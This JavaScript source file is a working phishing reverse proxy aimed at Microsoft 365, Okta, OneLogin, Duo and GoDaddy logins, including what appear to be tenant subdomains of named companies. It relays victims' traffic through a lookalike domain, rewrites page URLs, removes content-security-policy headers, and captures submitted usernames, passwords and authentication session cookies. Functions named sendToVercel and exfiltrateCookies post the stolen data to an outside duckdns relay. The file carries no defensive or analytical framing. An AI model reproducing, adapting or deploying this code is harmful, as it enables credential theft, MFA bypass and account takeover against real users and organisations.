export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'proxyapp.ddns.net';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'auth_id']
};
// =======================================================================

// In-memory store for partial credentials (Microsoft: username first, password second)
const credStore = new Map();

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {}
}

function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    const provider = IDENTITY_PROVIDERS[upstreamDomain];
    
    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }
  
  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    isProxied: false
  };
}

function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  const pathValues = params.getAll('path');
  
  if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
    const cleaned = new URLSearchParams();
    for (const [key, value] of params) {
      if (key !== 'path') cleaned.append(key, value);
    }
    const result = cleaned.toString();
    return result ? '?' + result : '';
  }
  
  if (pathValues.length === 1) {
    const val = pathValues[0];
    if (val.includes('.') || val === '_p' || val === 'common' || val === 'shared') {
      const cleaned = new URLSearchParams();
      for (const [key, value] of params) {
        if (key !== 'path') cleaned.append(key, value);
      }
      const result = cleaned.toString();
      return result ? '?' + result : '';
    }
  }
  
  return search;
}

function rewriteUrls(text, upstreamDomain) {
  let result = text;
  
  result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
  result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
  
  Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
    const escaped = domain.replace(/\./g, '\\.');
    result = result.replace(
      new RegExp(`https://${escaped}(?!\\w)`, 'g'),
      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
    result = result.replace(
      new RegExp(`http://${escaped}(?!\\w)`, 'g'),
      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
    result = result.replace(
      new RegExp(`//${escaped}(?!\\w)`, 'g'),
      `//${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
  });
  
  result = result.replace(
    /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
    `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
  );
  
  result = result.replace(
    /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
    `window.location.hostname = "${YOUR_DOMAIN}"`
  );
  result = result.replace(
    /document\.domain\s*=\s*["'][^"']+["']/g,
    `document.domain = "${YOUR_DOMAIN}"`
  );
  
  return result;
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    const shouldProxy = IDENTITY_PROVIDERS[url.hostname] || 
                       url.hostname.includes('microsoft') || 
                       url.hostname.includes('live.com') || 
                       url.hostname.includes('office.com') ||
                       url.hostname.includes('msauth.net');
    
    if (shouldProxy) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
    }
    return location;
  } catch (e) {
    return location;
  }
}

function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => {
    if (p === '.*') return true;
    return cookieString.toLowerCase().includes(p.toLowerCase());
  });
}

// ==================== PROVEN CREDENTIAL CAPTURE FROM ATTACHED CODE ====================
function parseCredentials(bodyText) {
  const keyValuePairs = bodyText.split('&');
  let user = null;
  let pass = null;
  
  for (const pair of keyValuePairs) {
    const [key, value] = pair.split('=');
    
    // Microsoft login uses 'login' or 'loginfmt' for username
    if ((key === 'login' || key === 'loginfmt') && value) {
      user = decodeURIComponent(value.replace(/\+/g, ' '));
    }
    
    // Microsoft login uses 'passwd' or 'password' for password
    if ((key === 'passwd' || key === 'password') && value) {
      pass = decodeURIComponent(value.replace(/\+/g, ' '));
    }
  }
  
  return { user, pass };
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
  
  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }
  
  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  const cleanSearch = cleanQueryString(url.search);
  const upstreamPath = info.path + cleanSearch;
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
  const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;
  
  console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);

  // Build headers
  const headers = new Headers(request.headers);
  headers.set('Host', upstreamDomain);
  headers.set('Referer', `https://${upstreamDomain}/`);
  headers.set('Origin', `https://${upstreamDomain}`);

  // ==================== CREDENTIAL CAPTURE (MERGED FROM ATTACHED CODE) ====================
  if (request.method === 'POST') {
    try {
      const temp_req = request.clone();
      const bodyText = await temp_req.text();
      
      console.log('[DEBUG] Raw body:', bodyText.substring(0, 300));
      
      // Use proven parsing logic from attached code
      const { user, pass } = parseCredentials(bodyText);
      
      // Handle two-step login (store username, wait for password)
      const credKey = `${ip}_${info.type}`;
      let existing = credStore.get(credKey) || { ip, platform: info.type, upstream: upstreamDomain };
      
      if (user) {
        existing.username = user;
        console.log(`[CRED] Username captured: ${user.substring(0, 5)}...`);
      }
      
      if (pass) {
        existing.password = pass;
        console.log(`[CRED] Password captured: ********`);
      }
      
      // If we have both, send immediately
      if (existing.username && existing.password) {
        await sendToVercel('credentials', {
          ...existing,
          url: displayUrl,
          timestamp: new Date().toISOString()
        });
        
        console.log(`[CREDENTIALS CAPTURED] ${existing.username} @ ${info.type}`);
        
        // Also save as file
        const content = `IP: ${ip}\nPlatform: ${info.type}\nUsername: ${existing.username}\nPassword: ${existing.password}\nURL: ${displayUrl}\n`;
        const formData = new FormData();
        formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
        formData.append("ip", ip);
        formData.append("type", "credentials");
        
        await fetch(VERCEL_URL, {
          method: "POST",
          body: formData,
        });
        
        credStore.delete(credKey);
      } else if (user || pass) {
        // Store partial for next request
        credStore.set(credKey, existing);
        console.log(`[CREDENTIALS PARTIAL] Stored ${user ? 'username' : 'password'} for ${ip}`);
        
        // Clean up after 5 minutes
        setTimeout(() => {
          credStore.delete(credKey);
        }, 300000);
      }
      
    } catch (error) {
      console.error('Credential capture error:', error);
    }
  }
  
  try {
    const fetchOpts = {
      method: request.method,
      headers,
      redirect: 'manual'
    };
    
    if (!['GET', 'HEAD'].includes(request.method)) {
      fetchOpts.body = request.body;
      fetchOpts.duplex = 'half';
    }
    
    const resp = await fetch(upstreamUrl, fetchOpts);
    
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const newHeaders = new Headers(resp.headers);
        const newLoc = rewriteLocation(loc);
        console.log(`[Redirect] ${loc} -> ${newLoc}`);
        newHeaders.set('Location', newLoc);
        return new Response(null, { status: resp.status, headers: newHeaders });
      }
    }
    
    const newHeaders = new Headers(resp.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.delete('content-security-policy');
    newHeaders.delete('content-security-policy-report-only');
    newHeaders.delete('clear-site-data');
    
    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
    let shouldCaptureCookies = false;
    let cookieStr = '';
    
    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      const isPost = request.method === 'POST';
      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
      shouldCaptureCookies = isPost || hasAuth;
      
      cookies.forEach(c => {
        const mod = c.replace(/Domain=[^;]+;?/gi, '');
        newHeaders.append('Set-Cookie', mod);
      });
    }
    
    if (shouldCaptureCookies && cookieStr) {
      await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
    }
    
    const ct = resp.headers.get('content-type') || '';
    if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
      let text = await resp.text();
      text = rewriteUrls(text, upstreamDomain);
      return new Response(text, { status: resp.status, headers: newHeaders });
    }
    
    return new Response(resp.body, { status: resp.status, headers: newHeaders });
    
  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(JSON.stringify({
      error: 'Proxy Error',
      message: err.message
    }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
